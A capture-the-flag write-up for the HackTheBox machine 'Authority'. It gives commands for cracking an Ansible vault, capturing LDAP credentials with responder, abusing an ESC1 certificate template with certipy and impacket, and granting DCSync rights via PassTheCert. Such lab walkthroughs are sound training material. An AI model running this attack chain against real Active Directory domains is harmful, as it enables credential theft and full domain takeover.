# HackTheBox - Authority

## NMAP

```
PORT      STATE SERVICE       VERSION              
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0 
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST                  
|_  Potentially risky methods: TRACE                 
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-07 19:35:01Z)                    
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-09-07T19:36:12+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d49477106f6b8100e4e19cf2aa40dae1
|_SHA-1: ddedb994b80c83a9db0be7d35853ff8e54c62d0b
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-09-07T19:36:12+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-09-07T19:36:12+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA
| Public Key type: rsa
| Public Key bits: 2048
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8443/tcp  open  ssl/https-alt
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
|_ssl-date: TLS randomness does not represent time
|_http-favicon: Unknown favicon MD5: F588322AAF157D82BB030AF1EFFD8CF9
```

Enumerating smb shares, we'll see two shares, `Development` and `Department Shares`

<img src="https://i.imgur.com/Fqmk1GH.png"/>

From Development shares, we'll get Ansible directory which further has directories for LDAP and ADCS

<img src="https://i.imgur.com/j8iRQ7f.png"/>

So we'll just recursively download all files

<img src="https://i.imgur.com/vuzgCEp.png"/>

From `LDAP/TODO.md` there's a note about changing the admin's LDAP password

<img src="https://i.imgur.com/tIXPBGE.png"/>

We can find the ansible vault encrypted password `PWM/defaults/main.yml`

<img src="https://i.imgur.com/eh8Wm3X.png"/>

To decrypt these, we need the vault password so generating the hash of any of them them with `ansible2john.py `

<img src="https://i.imgur.com/h0Xhexg.png"/>

With john we can crack the hash with the password `!@#$%^&*`

<img src="https://i.imgur.com/RlgEBku.png"/>

<img src="https://i.imgur.com/SD0L0h7.png"/>

The account points towards `PWM` which is is an open source password self-service application for LDAP directories. We can access the application on port 8443 

<img src="https://i.imgur.com/VdQm3No.png"/>

On logging in, it shows an error about not able to reach the ldap directories

<img src="https://i.imgur.com/D4k69zY.png"/>

However we can login to configuration manager

<img src="https://i.imgur.com/hMlGoMs.png"/>

Here we can access the configuration, download the existing configuration and also to upload one as well

<img src="https://i.imgur.com/fsfKHkA.png"/>

We can try adding our own IP to LDAP and run `responder` to see if it's reaching to our host so we may be able to capture the account with which it's authentication on LDAP

<img src="https://i.imgur.com/jMrkVnU.png"/>

After uploading this file, starting responder we'll receive clear text password for `svc_ldap` user

```bash
responder -I tun0 -w -d -v
```

<img src="https://i.imgur.com/4N0NaBk.png"/>

<img src="https://i.imgur.com/Xo6K4z3.png"/>

Through `crackmapexec`, we can verify if this user can read department share

<img src="https://i.imgur.com/BHeWWTx.png"/>
<img src="https://i.imgur.com/3G9qUlz.png"/>

Retrieving these directories recursively but all of these directories were empty

<img src="https://i.imgur.com/efCLits.png"/>

On enumerating users, we don't get to see any users other than administrator and svc_ldap

<img src="https://i.imgur.com/g5x4OXr.png"/>

Since there was ADCS directory, which points to Active Directory Certificate Services, that means that server role might be installed, we can enumerate vulnerable certificate templates with `certipy`

```bash
certipy find -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -vulnerable -stdout -dc-ip 10.10.11.222
```

<img src="https://i.imgur.com/jOYPvsl.png"/>
This `CorpVPN` template shows that it has `EnrolleSuppliesSubject` enable meaning that `SAN` (Subject Alternative Name) is enabled which allows to request certificate on behalf other user, in other words impersonating any domain user

`EKU` (Extended Key Usage) is set to `Client Authentication` which defines the purpose of this template which can be used to authenticate on any of domain server and lastly we have the enrollment rights for domain computers allowed which is known as `ESC1 certificate template attack`

If we can add a machine account, we can request for administrator's certificate, so verifying if we have machine quota available

<img src="https://i.imgur.com/1agElo2.png"/>

Quota of 10 is available, adding a machine account with `addcomputer.py` from impacket

```bash
addcomputer.py -method LDAPS -dc-ip 10.10.11.222 -computer-pass P@ass12345 -computer-name UwU authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!'
```

<img src="https://i.imgur.com/4GTekZU.png"/>

After adding the machine account, we can request for administrator's certificate

```bash
certipy req -c 'AUTHORITY-CA' -u 'UwU$' -p 'P@ass12345' -template 'CorpVPN' -upn 'administrator' -dc-ip 10.10.11.222
```

<img src="https://i.imgur.com/9xdL9tO.png"/>

On retrieving the NThash it failed with an error `KDC_ERR_PDATA_TYPE_NOSUPP`

<img src="https://i.imgur.com/ef8A7GY.png"/>

The reason we couldn't get the hash through this way is because of DC not supporting the PKINIT authentication which is a pre-authentication allowing to retrieve either TGT or NTHash, reason being certificate doesn't have Smart Card Logon EKU installed, having a read on this article, it's still possible to abuse this since we have the administrator's certificate we can do the following attacks

- Add our created machine account to DC's `msDS-AllowedToActOnBehalfOfOtherIdentity` property to perform resource based delegation `RCBD`
- Modify account's password
- Granting the low privileged user DCSync rights

This can be achieved through PassTheCert https://github.com/AlmondOffSec/PassTheCert/tree/main/Python

The scripts needs the key and certificate separately, through certipy we can extract them

```bash
certipy cert -pfx administrator.pfx -nokey -out administrator.crt
certipy cert -pfx administrator.pfx -nocert -out administrator.key
```

<img src="https://i.imgur.com/Ki7mh8Q.png"/>

Here I am going with granting svc_ldap DCSync rights

```bash
python3 /opt/PassTheCert/PassTheCert.py -action modify_user -crt administrator.crt -key administrator.key -target svc_ldap -elevate -domain authority.htb -dc-ip 10.10.11.222
```

<img src="https://i.imgur.com/EASqflD.png"/>

<img src="https://i.imgur.com/kEFwtNi.png"/>
Now logging using `evil-winrm` on WinRM

<img src="https://i.imgur.com/MK1FDIk.png"/>

# References

- https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html?ref=7ms.us
- https://7ms.us/7ms-532-tales-of-pentest-pwnage-part-39/
- https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d
- https://github.com/AlmondOffSec/PassTheCert/tree/main/Python
